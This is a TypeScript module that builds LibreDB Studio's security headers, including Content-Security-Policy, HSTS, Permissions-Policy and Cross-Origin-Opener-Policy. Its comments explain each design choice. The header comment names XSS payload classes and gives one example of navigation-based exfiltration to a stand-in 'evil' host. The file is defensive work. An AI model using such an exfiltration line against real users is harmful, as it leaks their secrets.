/**
 * The security header set LibreDB Studio requires, as pure data.
 *
 * THIS MODULE MUST HAVE NO IMPORTS. It is published as `@libredb/studio/security` so that
 * libredb-platform can adopt the same policy from its own Next config, where neither the "@/"
 * alias nor a Studio runtime exists. Anything that reads process.env belongs in
 * src/lib/security/config.ts, not here.
 *
 * What this CSP buys, stated honestly so nobody later reads 'unsafe-inline' as an oversight:
 * every document route in this app is statically prerendered with nonce-less inline
 * `self.__next_f.push` scripts, and a per-request nonce cannot be applied to prerendered HTML.
 * So script-src carries 'unsafe-inline', and the policy does NOT block the <img onerror> /
 * <svg onload> payload class. Phase 0 closed that class by construction (React element
 * rendering, no HTML strings). What this policy adds is exfiltration and loader containment:
 * connect-src blocks fetch to an attacker host, img-src blocks beacon-by-image to a foreign
 * origin, form-action blocks form-based exfiltration, base-uri blocks relative-URL hijacking,
 * object-src and frame-src remove the plugin and frame vectors, and script-src 'self' still
 * blocks loading a remote script and every eval. Top-level navigation exfiltration
 * (location = "https://evil/?" + secret) remains possible; CSP has had no directive for it since
 * navigate-to was withdrawn.
 */

export type CspDirectives = Record<string, string[]>;

export interface CspOptions {
  /**
   * Absolute URL or path where Monaco's AMD bundle is served. An absolute URL adds its origin to
   * script-src and worker-src. Defaults to the same-origin /monaco/vs, which needs no source.
   */
  monacoVsPath?: string;
  /**
   * Extra sources merged per directive, for hosts only the embedder knows about.
   *
   * Adding a source to a deny-only directive (base-uri, object-src, frame-src and
   * frame-ancestors all start as ['none']) removes the 'none' placeholder instead of keeping it
   * alongside the addition: CSP treats 'none' as inert once another source is present, so keeping
   * both would leave a header that reads as a denial while actually permitting the added source.
   * That is a deliberate decision for the caller to make, not a default to fall into by accident.
   */
  extra?: Partial<CspDirectives>;
  /**
   * Add 'unsafe-eval' to script-src. React's DEVELOPMENT build evals, and without it a
   * contributor's first `bun dev` cannot log in: the login page never hydrates, the Sign In button
   * has no handler, and the only clue is "eval() is not supported in this environment".
   *
   * An OPTION rather than a `process.env.NODE_ENV` read in this module, because this module is
   * published as `@libredb/studio/security` and must stay environment-independent - otherwise an
   * embedder's own development build would silently inherit a relaxed policy it never asked for.
   * `readSecurityHeaderOptions()` in config.ts is what decides it for this app.
   */
  allowEval?: boolean;
}

export interface SecurityHeaderOptions extends CspOptions {
  /** Emit Content-Security-Policy-Report-Only instead of Content-Security-Policy. */
  reportOnly?: boolean;
  /**
   * false disables HSTS; an object customises it. The caller owns validating maxAgeSeconds — it
   * is not clamped or checked here, so a bad value (for instance one forwarded from an unvalidated
   * environment variable) passes straight through and serializes as `max-age=NaN`.
   */
  hsts?: false | { maxAgeSeconds: number; includeSubDomains?: boolean };
}

/**
 * 180 days, not two years, and without preload: a self-hoster who reverts to plain HTTP must not
 * be locked out of their own deployment for two years. RFC 6797 requires user agents to ignore
 * the header when it arrives over plain HTTP, so the plain-HTTP channels (umbrelOS, Unraid, the
 * Azure template, the desktop loopback shell) are unaffected and no decision has to be made about
 * trusting x-forwarded-proto.
 */
export const HSTS_MAX_AGE_SECONDS = 15_552_000;

/**
 * Permissions-Policy lists ONLY denials. An unlisted feature keeps its default allowlist ('self'),
 * which is why clipboard-read and clipboard-write must not appear here: the results grid copies to
 * the clipboard, and listing them with a narrower value is how that breaks.
 */
const DENIED_FEATURES = [
  "accelerometer",
  "autoplay",
  "camera",
  "display-capture",
  "encrypted-media",
  "geolocation",
  "gyroscope",
  "magnetometer",
  "microphone",
  "midi",
  "payment",
  "publickey-credentials-get",
  "screen-wake-lock",
  "serial",
  "usb",
  "xr-spatial-tracking",
];

const PERMISSIONS_POLICY = DENIED_FEATURES.map((feature) => `${feature}=()`).join(", ");

/**
 * The origin of an absolute http(s) URL, or undefined for a relative path.
 *
 * Only recognises absolute `http://`/`https://` URLs. A protocol-relative URL
 * (`//cdn.example.com/monaco/vs`) or a bare host with no scheme is treated as a same-origin path
 * and gets no script-src/worker-src grant, which fails Monaco's load with nothing pointing at the
 * CSP as the cause.
 */
function absoluteOrigin(value: string | undefined): string | undefined {
  if (!value) return undefined;
  if (!/^https?:\/\//i.test(value)) return undefined;
  const pathStart = value.indexOf("/", value.indexOf("://") + 3);
  if (pathStart === -1) return value;
  return value.slice(0, pathStart);
}

function mergeSources(base: CspDirectives, extra: Partial<CspDirectives> | undefined): CspDirectives {
  if (!extra) return base;
  const merged: CspDirectives = { ...base };
  for (const [directive, sources] of Object.entries(extra)) {
    if (!sources) continue;
    const current = merged[directive] ?? [];
    const additions = sources.filter((source) => !current.includes(source));
    // CSP evaluates a source list source-by-source: 'none' means "match nothing" only when it is
    // the SOLE entry, and is inert alongside any other source. So a directive that started as
    // exactly ['none'] must drop it the moment the caller adds a real source — keeping both would
    // serialize as e.g. "frame-ancestors 'none' https://embedder.example", which reads as a total
    // denial while actually permitting that origin. Re-asserting 'none' with no new source (the
    // additions.length === 0 case) leaves the directive untouched.
    const isDenyOnly = current.length === 1 && current[0] === "'none'";
    merged[directive] = isDenyOnly && additions.length > 0 ? additions : [...current, ...additions];
  }
  return merged;
}

function serializeCsp(directives: CspDirectives): string {
  return Object.entries(directives)
    .map(([directive, sources]) => (sources.length > 0 ? `${directive} ${sources.join(" ")}` : directive))
    .join("; ");
}

/** The directives Monaco and Studio actually require, as a structured, mergeable map. */
export function studioCspDirectives(options: CspOptions = {}): CspDirectives {
  const monacoOrigin = absoluteOrigin(options.monacoVsPath);

  // 'unsafe-inline': see the module comment. 'unsafe-eval' is absent unless the CALLER asks for it
  // (`allowEval`, which config.ts sets in development only) — Monaco's AMD loader picks the
  // tag-injection loader on the document thread (public/monaco/vs/loader.js:365), and no worker
  // bundle, elkjs, or sql-formatter path calls eval or new Function.
  const scriptSrc = ["'self'", "'unsafe-inline'"];
  if (options.allowEval === true) scriptSrc.push("'unsafe-eval'");
  // Monaco injects <style> elements at runtime for the db-dark theme, and the app uses the React
  // style={{...}} prop with computed values at 41 sites. Neither is nonce-able or hash-able.
  const styleSrc = ["'self'", "'unsafe-inline'"];
  // The ELK layout worker (src/components/schema-diagram/elk.worker.ts) is a same-origin module
  // worker and needs nothing beyond 'self'. blob: is also required: Monaco's bundled language
  // workers (json/css/html/typescript, and the default worker used for every other language,
  // including this app's SQL editor) are NOT same-origin module workers — Monaco's own worker
  // factory (public/monaco/vs/editor/editor.main.js, function F) wraps each worker script in a
  // `new Blob([...])` + `importScripts(...)`, then constructs the Worker from that blob: URL, so
  // it can load the same worker code regardless of Monaco's own origin. This was documented as
  // "no blob: worker exists anywhere" before e2e/security-headers.spec.ts proved otherwise against
  // a real production build — the report-only stage exists precisely to catch a claim like that.
  const workerSrc = ["'self'", "blob:"];

  if (monacoOrigin) {
    scriptSrc.push(monacoOrigin);
    // Monaco's AMD loader resolves editor.main.css against the same "vs" base path as the script
    // bundle (via its own vs/css loader plugin - public/monaco/vs/editor/editor.main.js's
    // `createElement("link")` call), so an off-origin monacoVsPath serves that stylesheet from
    // monacoOrigin too. Missing this left the enforced CSP blocking the stylesheet the documented
    // off-origin NEXT_PUBLIC_MONACO_VS_PATH setup depends on - Monaco would load with every gutter
    // and menu glyph, and the editor's own syntax styling, silently unstyled.
    styleSrc.push(monacoOrigin);
    workerSrc.push(monacoOrigin);
  }

  return mergeSources(
    {
      "default-src": ["'self'"],
      "base-uri": ["'none'"],
      "object-src": ["'none'"],
      "frame-src": ["'none'"],
      "frame-ancestors": ["'none'"],
      "form-action": ["'self'"],
      "script-src": scriptSrc,
      "style-src": styleSrc,
      // data: is load-bearing: @zumer/snapdom rasterizes by assigning a data:image/svg+xml URL to
      // an <img>, which the ER-diagram and chart PNG exports both go through. blob: is a
      // same-origin-only scheme with no exfiltration value and removes a silent-failure class.
      "img-src": ["'self'", "data:", "blob:"],
      // Monaco's editor.main.css embeds the codicon icon font as a base64 data: URI. Without this
      // the editor keeps working while every gutter and menu glyph silently disappears.
      "font-src": ["'self'", "data:"],
      "connect-src": ["'self'"],
      "worker-src": workerSrc,
    },
    options.extra,
  );
}

/** Ready-to-spread header name to value map, CSP already serialized. */
export function securityHeaders(options: SecurityHeaderOptions = {}): Record<string, string> {
  const policy = serializeCsp(studioCspDirectives(options));
  const cspHeader = options.reportOnly ? "Content-Security-Policy-Report-Only" : "Content-Security-Policy";

  const headers: Record<string, string> = {
    "X-Content-Type-Options": "nosniff",
    // same-origin, NOT strict-origin-when-cross-origin: it leaks nothing cross-origin AND it
    // preserves the same-origin Referer that the Origin check uses as its fallback signal.
    "Referrer-Policy": "same-origin",
    "Permissions-Policy": PERMISSIONS_POLICY,
    // Duplicates frame-ancestors 'none' deliberately, for engines that predate CSP Level 2.
    // Verified safe: zero <iframe> in src, and the desktop shell navigates rather than frames.
    "X-Frame-Options": "DENY",
    // `same-origin`, not `same-origin-allow-popups`: the weaker value exists for a page that opens
    // a popup and then scripts it, and nothing here does. The OIDC flow is a top-level redirect in
    // both directions (src/app/login/login-form.tsx sets `window.location.href =
    // "/api/auth/oidc/login"`; src/hooks/use-auth.ts assigns the logout redirectUrl the same way),
    // and the one window.open in the repository — src/lib/community/star-prompt-toast.ts — already
    // passes "noopener,noreferrer", so it has no opener relationship left for COOP to sever.
    //
    // Document-only, which is why it is set HERE (per request, applied by src/proxy.ts) and is
    // named in next.config.ts's DOCUMENT_ONLY_HEADER_NAMES so it can never join the build-time
    // baked set. HTML's "create navigation params by fetching" obtains a response's opener policy
    // under exactly one step - "If navigable is a top-level traversable: Set responseCOOP to the
    // result of obtaining an opener policy given response and request's reserved client"
    // (https://html.spec.whatwg.org/multipage/browsing-the-web.html#create-navigation-params-by-fetching).
    // Quoted whole because the opening clause alone occurs twice on that page, the other time in an
    // unrelated step about the top-level navigation initiator origin. So no algorithm consults this
    // header on a subresource, and it is ignored even for a framed document. Note the spec's own
    // vocabulary: the algorithm is "obtain an opener policy" - "cross-origin opener policy" now
    // survives only as the header field name.
    //
    // Inert rather than harmful on the plain-HTTP distribution channels: "obtain an opener policy"
    // returns the default `unsafe-none` policy before it looks at the header at all — "If
    // reservedEnvironment is a non-secure context, then return policy"
    // (https://html.spec.whatwg.org/multipage/browsers.html#obtain-coop). Loopback is a secure
    // context, so the desktop shell is not among those.
    //
    // Deliberately NOT paired with `Cross-Origin-Embedder-Policy: require-corp`. Under
    // `require-corp` a response carrying no `Cross-Origin-Resource-Policy` header has its policy
    // set to `same-origin` by the cross-origin resource policy internal check
    // (https://fetch.spec.whatwg.org/#cross-origin-resource-policy-internal-check), so every
    // cross-origin subresource would have to serve CORP itself — which the documented off-origin
    // NEXT_PUBLIC_MONACO_VS_PATH setup cannot promise. The capability that would buy is
    // cross-origin isolation (SharedArrayBuffer, `crossOriginIsolated`), which nothing here uses,
    // so `same-origin` alone is the whole of the decision.
    "Cross-Origin-Opener-Policy": "same-origin",
    [cspHeader]: policy,
  };

  const hsts = options.hsts ?? { maxAgeSeconds: HSTS_MAX_AGE_SECONDS };
  if (hsts !== false) {
    headers["Strict-Transport-Security"] = hsts.includeSubDomains
      ? `max-age=${hsts.maxAgeSeconds}; includeSubDomains`
      : `max-age=${hsts.maxAgeSeconds}`;
  }

  return headers;
}
